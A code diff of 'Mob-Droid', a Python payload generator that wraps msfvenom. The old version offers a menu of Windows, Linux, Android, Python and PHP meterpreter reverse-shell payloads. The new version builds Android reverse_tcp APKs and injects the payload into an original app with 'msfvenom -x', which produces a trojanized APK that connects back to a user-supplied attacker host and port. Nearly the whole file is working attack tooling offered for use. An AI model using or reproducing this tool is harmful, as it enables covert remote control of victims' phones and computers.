@@ -1,176 +1,99 @@
-#!/usr/bin/python
-#-*- coding: utf-8 -*-
-#Author      Mohit Saran
-#YouTube     Hacker's King
-#Instagram   Kinghacker0
-#Website     hackersking.in
+#!/usr/bin/python3
+# -*- coding: utf-8 -*-
+# Author      Mohit Kumar
+# Instagram   Kinghacker0
+# Website     https://elearning.hackersking.com
+# Copyright   © 2025 Hackersking
 
 import os, platform
-from SimpleHTTPServer import test
 from sys import exit
 from time import sleep
 
-red= '\033[91m'
-orange= '\33[38;5;208m'
-green= '\033[92m'
-cyan= '\033[36m'
-bold= '\033[1m'
-end= '\033[0m'
+# Colors for styling
+red = '\033[91m'
+orange = '\33[38;5;208m'
+green = '\033[92m'
+cyan = '\033[36m'
+yellow = '\033[93m'
+blue = '\033[94m'
+magenta = '\033[95m'
+bold = '\033[1m'
+end = '\033[0m'
 
 def head():
     os.system('clear')
-    print'''{0}
+    print(f"""{bold}{red}
                  ▀▄   ▄▀
                 ▄█▀███▀█▄
                █▀███████▀█
                █─█▀▀▀▀▀█─█
                   ▀▀─▀▀
-       *****    Mob-Droid   *****
-{2}Follow me :{3}
-{1}•{3} GitHub : {4}https://github.com/kinghacker0{3}
-{1}•{3} YouTube: {4}https://www.youtube.com/hackersking101{3}
-{1}•{3} Website: {4}https://hackersking.in{3}
-'''.format(orange, green, bold, end, cyan)
+       *****    {yellow}Mob-Droid -Latest Android Payload Generator{red}   *****
+{cyan}Follow me :{end}
+{green}• More on GitHub : {cyan}https://github.com/kinghacker0{end}
+{green}• YouTube: {cyan}https://www.youtube.com/@hackersking101{end}
+{green}• Join Our Community: {cyan}https://hackersking.rpy.club{end}
+{bold}{red}----------------------------------------------------
+            © 2025 Hackersking eLearning
+----------------------------------------------------{end}""")
 
-def finish():
+def install_tools():
     head()
-    print('{0}Until next time...{1}').format(green, end)
-    exit(0)
+    print(f"{bold}{yellow}Installing Apktool, Apksigner, and Zipalign...{end}")
+    os.system('git clone https://github.com/kinghacker0/Apktool')
+    os.system('wget https://github.com/kinghacker0/Apktool/releases/download/2.11.0/apktool.jar -O apktool.jar')
+    os.system('wget https://raw.githubusercontent.com/patrickfav/uber-apk-signer/master/apksigner -O apksigner')
+    os.system('wget https://developer.android.com/studio/command-line/zipalign -O zipalign')
+    print(f"{green}Tools installed successfully!{end}")
+    sleep(2)
 
-def present():
-    if os.path.isfile('/usr/bin/msfvenom') == False:
-        print('{0}Failed to locate msfvenom. Make sure Metasploit-Framework is installed correctly and try again.{1}').format(red, end)
-        exit(0)
-    if os.path.isdir('output') == False:
-        head()
-        print('{0}Creating output directory{1}').format(green, end)
-        os.makedirs('output')
-        sleep(1)
-    if os.path.isfile('ngrok') == False:
-        head()
-        print("{0}Downloading Ngrok...{1}").format(green, end)
-        if platform.architecture == "32bit":
-            wget.download('https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.tgz')
-            os.system('tar -xf ngrok-stable-linux-386.tgz')
-            os.system('rm ngrok-stable-linux-386.tgz')
-        else:
-            os.system('tar -xf ngrok-stable-linux-amd64.tgz')
-            os.system('rm ngrok-stable-linux-amd64.tgz')
-
-def server():
-    os.system('cd output/ && python -m SimpleHTTPServer 80')
-
-def main(platform, type):
-    lhost = raw_input("\nEnter your LHOST\n{0}{1}Mob-Droid:~/LHOST#{2} ".format(green, bold, end))
-    lport = raw_input("\nEnter your LPORT\n{0}{1}Mob-Droid:~/LPORT#{2} ".format(green, bold, end))
-    output = raw_input("\nEnter the name of output file\n{0}{1}Mob-Droid:~/output#{2} ".format(green, bold, end))
-    #Windows
-    if platform == 'Windows' and type == '1':
-        payload= 'windows/meterpreter/reverse_http'
-        format= 'exe'
-        extension= '.exe'
-    if platform == 'Windows' and type == '2':
-        payload= 'windows/meterpreter/reverse_https'
-        format= 'exe'
-        extension= '.exe'
-    if platform == 'Windows' and type == '3':
-        payload= 'windows/meterpreter/reverse_tcp'
-        format= 'exe'
-        extension= '.exe'
-    #linux
-    if platform == 'Linux' and type == '1':
-        payload= 'linux/x86/shell/reverse_tcp'
-        format= 'elf'
-        extension= '.elf'
-    if platform == 'Linux' and type == '2':
-        payload= 'linux/x86/meterpreter/reverse_tcp'
-        format= 'elf'
-        extension= '.elf'
-    #Android
-    elif platform == 'Android' and type == '1':
-        payload= 'android/meterpreter/reverse_http'
-        format= 'raw'
-        extension= '.apk'
-    elif platform == 'Android' and type == '2':
-        payload= 'android/meterpreter/reverse_https'
-        format= 'raw'
-        extension= '.apk'
-    elif platform == 'Android' and type == '3':
-        payload= 'android/meterpreter/reverse_tcp'
-        format= 'raw'
-        extension= '.apk'
-    #Python
-    elif platform == 'Python' and type == '1':
-        payload= 'python/meterpreter/reverse_http'
-        format= 'raw'
-        extension= '.py'
-    elif platform == 'Python' and type == '2':
-        payload= 'python/meterpreter/reverse_https'
-        format= 'raw'
-        extension= '.py'
-    elif platform == 'Python' and type == '3':
-        payload= 'python/meterpreter/reverse_tcp'
-        format= 'raw'
-        extension= '.py'
-    #PHP
-    elif platform == 'PHP' and type == '1':
-        payload= 'php/meterpreter/reverse_tcp'
-        format= 'raw'
-        extension= '.php'
-    os.system('msfvenom -p '+payload+' LHOST='+lhost+' LPORT='+lport+' -f'+format+' -o output/'+output+extension)
+def generate_payload():
+    head()
+    lhost = input(f"\n{cyan}Enter your LHOST{end}\n{green}{bold}Mob-Droid:~/LHOST#{end} ")
+    lport = input(f"\n{cyan}Enter your LPORT{end}\n{green}{bold}Mob-Droid:~/LPORT#{end} ")
+    output = input(f"\n{cyan}Enter the name of output file{end}\n{green}{bold}Mob-Droid:~/output#{end} ")
+    payload = 'android/meterpreter/reverse_tcp'
+    os.system(f'msfvenom -p {payload} LHOST={lhost} LPORT={lport} -o output/{output}.apk')
     sleep(3)
-    if os.path.isfile('output/'+output+extension) == False:
-        head()
-        raw_input('{2}Failed to create payload, please try again.{1} {0}(Hit Enter to continue){1}'.format(bold, end, red))
-        choosepayload()
-       
-def choosepayload():
-    head()
-    select = raw_input('{2}Choose a payload platform:{1}\n\n{0}[{1}1{0}]{1} Windows\n{0}[{1}2{0}]{1} Linux\n{0}[{1}3{0}]{1} Android\n{0}[{1}4{0}]{1} Python\n{0}[{1}5{0}]{1} PHP\n{0}[{1}0{0}]{1} Exit\n\n{0}{2}Mob-Droid:~#{1} '.format(green, end, bold))
-    if select == '1':
-        head()
-        type = raw_input('{2}Choose a payload type:{1}\n\n{0}[{1}1{0}]{1} windows/meterpreter/reverse_http\n{0}[{1}2{0}]{1} windows/meterpreter/reverse_https\n{0}[{1}3{0}]{1} windows/meterpreter/reverse_tcp\n{0}[{1}0{0}]{1} Main Menu\n\n{0}{2}Mob-Droid:~/Windows#{1} '.format(green, end, bold))
-        if type == '0':
-            choosepayload()
-        main('Windows', type)
-    elif select == '2':
-        head()
-        type = raw_input('{2}Choose a payload type:{1}\n\n{0}[{1}1{0}]{1} linux/x86/shell/reverse_tcp\n{0}[{1}2{0}]{1} linux/x86/meterpreter/reverse_tcp\n{0}[{1}0{0}]{1} Main Menu\n\n{0}{2}Mob-Droid:~/Linux#{1} '.format(green, end, bold))
-        if type == '0':
-            choosepayload()
-        main('Linux', type)
-    elif select == '3':
-        head()
-        type = raw_input('{2}Choose a payload type:{1}\n\n{0}[{1}1{0}]{1} android/meterpreter/reverse_http\n{0}[{1}2{0}]{1} android/meterpreter/reverse_https\n{0}[{1}3{0}]{1} android/meterpreter/reverse_tcp\n{0}[{1}0{0}]{1} Main Menu\n\n{0}{2}Mob-Droid:~/Android#{1} '.format(green, end, bold))
-        if type == '0':
-            choosepayload()
-        main('Android', type)
-    elif select == '4':
-        head()
-        type = raw_input('{2}Choose a payload type:{1}\n\n{0}[{1}1{0}]{1} python/meterpreter/reverse_http\n{0}[{1}2{0}]{1} python/meterpreter/reverse_https\n{0}[{1}3{0}]{1} python/meterpreter/reverse_tcp\n{0}[{1}0{0}]{1} Main Menu\n\n{0}{2}Mob-Droid:~/Python#{1} '.format(green, end, bold))
-        if type == '0':
-            choosepayload()
-        main('Python', type)
-    elif select == '5':
-        head()
-        type = raw_input('{2}Choose a payload type:{1}\n\n{0}[{1}1{0}]{1} php/meterprter/reverse_tcp\n{0}[{1}0{0}]{1} Main Menu\n\n{0}{2}Mob-Droid:~/PHP#{1} '.format(green, end, bold))
-        if type == '0':
-            choosepayload()
-        main('PHP', type)
-    elif select == '6':
-        ngrok()
-    elif select == '0':
-        finish()
+    if os.path.isfile(f'output/{output}.apk'):
+        print(f"{green}Payload generated successfully!{end}")
     else:
-        head()
-        print('{0}Please choose a valid option.{1}').format(red, end)
+        print(f"{red}Failed to create payload! Try again.{end}")
+
+def inject_payload():
+    head()
+    original_apk = input(f"{cyan}Enter the path to the original APK:{end} ")
+    lhost = input(f"{cyan}Enter your LHOST:{end} ")
+    lport = input(f"{cyan}Enter your LPORT:{end} ")
+    output = input(f"{cyan}Enter the name of injected APK:{end} ")
+    payload = 'android/meterpreter/reverse_tcp'
+    os.system(f'msfvenom -x {original_apk} -p {payload} LHOST={lhost} LPORT={lport} -o output/{output}.apk')
+    print(f"{green}Payload injected successfully!{end}")
+
+def main_menu():
+    head()
+    print(f"{bold}{yellow}Select an Option:{end}")
+    print(f"{green}[1]{end} Generate Android Payload")
+    print(f"{green}[2]{end} Inject Payload into Original APK")
+    print(f"{green}[3]{end} Install Apktool, Apksigner, Zipalign")
+    print(f"{green}[0]{end} Exit")
+    choice = input(f"\n{bold}{cyan}Mob-Droid:~#{end} ")
+    if choice == '1':
+        generate_payload()
+    elif choice == '2':
+        inject_payload()
+    elif choice == '3':
+        install_tools()
+    elif choice == '0':
+        exit(0)
+    else:
+        print(f"{red}Invalid option! Try again.{end}")
         sleep(2)
-        choosepayload()
+        main_menu()
 
 if __name__ == "__main__":
     try:
-        head()
-        present()
-        choosepayload()
+        main_menu()
     except KeyboardInterrupt:
-        finish()
+        print(f"\n{red}Process interrupted by user. Exiting...{end}")
+        exit(0)
